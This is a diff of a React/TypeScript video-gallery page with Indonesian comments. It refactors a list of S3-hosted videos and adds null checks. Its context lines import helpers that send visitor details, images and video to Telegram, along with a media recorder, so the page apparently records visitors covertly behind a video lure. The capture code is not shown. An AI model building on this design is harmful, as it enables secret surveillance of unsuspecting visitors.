@@ -5,6 +5,24 @@ import './styles/custom.css';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
 
+// Definisikan tipe untuk objek video
+interface Video {
+  videoUrl: string;
+  hlsUrl: string;
+}
+
+// Definisikan array videos dengan tipe yang tepat
+const videos: Video[] = [
+  { 
+    videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4',
+    hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8'
+  },
+  { 
+    videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio3.mp4',
+    hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio3/vidio3.m3u8'
+  }
+];
+
 // Fungsi untuk membagi array video menjadi kelompok 5 untuk slide
 const chunkArray = <T,>(array: T[], size: number): T[][] => {
   const result: T[][] = [];
@@ -34,17 +52,6 @@ function App() {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const sliderRef = useRef<Slider | null>(null);
 
-  const videos = [[
-    { 
-      videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/kontoll.mp4',
-      hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/kontoll/kontoll.m3u8'
-    },
-    { 
-      videoUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/original/vidio3.mp4',
-      hlsUrl: 'https://hlsvidiobucket.s3.ap-southeast-2.amazonaws.com/hls/vidio3/vidio3.m3u8'
-    }
-  ]];
-
   const videoSlides = chunkArray(videos, 5);
 
   useEffect(() => {
@@ -58,7 +65,7 @@ function App() {
         entries.forEach((entry) => {
           if (entry.isIntersecting) {
             const slideIndex = parseInt(entry.target.getAttribute('data-slide-index') || '0', 10);
-            if (!loadedSlides.includes(slideIndex)) { // Perbaikan: proportionateSlides -> loadedSlides
+            if (!loadedSlides.includes(slideIndex)) {
               console.log(`Memuat slide: ${slideIndex}`);
               setLoadedSlides((prev) => [...prev, slideIndex]);
             }
@@ -77,18 +84,20 @@ function App() {
   }, [loadedSlides]);
 
   useEffect(() => {
-    const activeSlideVideos = videoSlides[currentSlide];
+    const activeSlideVideos = videoSlides[currentSlide] || [];
     activeSlideVideos.forEach((video, index) => {
       const globalIndex = currentSlide * 5 + index;
-      const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
-      console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
-      if (!validateVideoUrl(urlToValidate)) {
-        console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
-        setVideoErrors((prev) => {
-          const newErrors = [...prev];
-          newErrors[globalIndex] = true;
-          return newErrors;
-        });
+      if (video) {
+        const urlToValidate = isSafari() ? video.hlsUrl : video.videoUrl;
+        console.log(`Memeriksa video ${globalIndex + 1}: ${urlToValidate}`);
+        if (!validateVideoUrl(urlToValidate)) {
+          console.error(`Video ${globalIndex + 1} memiliki URL yang tidak valid.`);
+          setVideoErrors((prev) => {
+            const newErrors = [...prev];
+            newErrors[globalIndex] = true;
+            return newErrors;
+          });
+        }
       }
     });
   }, [currentSlide]);
@@ -631,9 +640,8 @@ function App() {
                   </div>
                 ) : (
                   <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
-                    {slideVideos.map((_, index) => {
+                    {slideVideos.map((video, index) => {
                       const globalIndex = slideIndex * 5 + index;
-                      const video = videos[globalIndex];
                       return (
                         <div
                           key={globalIndex}
